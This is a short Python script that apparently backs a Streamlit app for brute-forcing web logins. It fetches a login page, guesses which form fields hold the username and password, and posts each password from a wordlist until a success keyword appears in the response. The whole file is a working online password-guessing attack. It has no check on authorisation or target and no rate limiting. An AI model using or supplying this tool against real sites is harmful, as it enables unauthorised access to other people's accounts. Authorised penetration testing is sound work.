import requests
from bs4 import BeautifulSoup


def get_login_form(login_url):

    session = requests.Session()
    response = session.get(login_url)

    soup = BeautifulSoup(response.text, "html.parser")
    form = soup.find("form")

    # Extract form action and method
    action = form.get("action")
    method = form.get("method", "post").lower()

    # Extract all input fields
    fields = {}
    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        value = input_tag.get("value", "")
        if name:
            fields[name] = value

    return session, action, method, fields


def run_bruteforce_streamlit(
    login_url, username, wordlist_path, update_progress, success_keyword="dashboard"
):

    # Load the form structure and session
    session, action, method, form_data = get_login_form(login_url)

    # Try to detect the username and password field names
    username_field = next((k for k in form_data if "user" in k.lower()), None)
    password_field = next((k for k in form_data if "pass" in k.lower()), None)

    if not username_field or not password_field:
        return "[!] Could not identify login fields. Manual adjustment needed."

    # Load wordlist into memory
    with open(wordlist_path, "r", encoding="latin-1") as f:
        passwords = f.readlines()

    total = len(passwords)

    # Start brute-force loop
    for i, password in enumerate(passwords):
        password = password.strip()
        form_data[username_field] = username
        form_data[password_field] = password

        # Construct full URL for form submission
        full_action_url = (
            login_url + action if not action.startswith("http") else action
        )

        # Send login attempt
        response = session.post(full_action_url, data=form_data)

        # Check if success keyword is found
        if success_keyword.lower() in response.text.lower():
            update_progress(100)
            return f"[+] SUCCESS: Password found: **{password}**"

        # Update progress bar
        progress = int(((i + 1) / total) * 100)
        update_progress(progress)

    return "[-] Password not found in wordlist."
